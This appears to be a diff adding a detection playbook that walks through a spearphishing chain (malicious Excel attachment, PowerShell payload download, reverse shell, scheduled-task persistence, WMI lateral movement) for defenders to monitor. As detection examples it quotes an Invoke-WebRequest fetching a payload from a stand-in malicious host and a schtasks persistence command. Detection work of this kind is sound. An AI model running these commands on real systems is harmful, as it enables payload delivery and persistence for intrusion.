@@ -1,0 +1,17 @@
+1. **Identify Initial Access via Spearphishing Email**  
+   - Monitor for email events where the subject line contains "Important Update" and the attachment is named "Update_2023.xlsx". This can be captured in email logs or security gateways.
+
+2. **Map Opening of Malicious Attachment**  
+   - Detect the execution of Microsoft Excel (Image: `C:\Program Files\Microsoft Office\root\OfficeXX\EXCEL.EXE`) with the command line indicating the opening of the file "Update_2023.xlsx". This should be logged as a `Process Create` event.
+
+3. **Validate Macro Execution and Payload Download**  
+   - Track PowerShell execution initiated from Excel that includes a command to download a file (e.g., `Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe'`). This should be logged as a `Process Create` event for PowerShell (Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`).
+
+4. **Monitor Execution of the Malicious Payload**  
+   - Detect the execution of the downloaded payload (malicious_payload.exe) which establishes a reverse shell connection. This should be logged as a `Process Create` event with the Image path of the malicious payload.
+
+5. **Track Establishing Persistence**  
+   - Monitor for the creation of a scheduled task that executes the malicious payload. This can be captured by detecting the command used to create the task (e.g., `schtasks /create /tn "MaliciousTask" /tr "C:\\Users\\Victim\\Downloads\\malicious_payload.exe" /sc onlogon`).
+
+6. **Detect Lateral Movement and Data Exfiltration**  
+   - Monitor for WMI queries executed via PowerShell that are unusual or originate from unexpected sources. This can be captured by detecting WMI command executions that query system information (e.g., `wmic /node:"target-machine" product get name,version`).
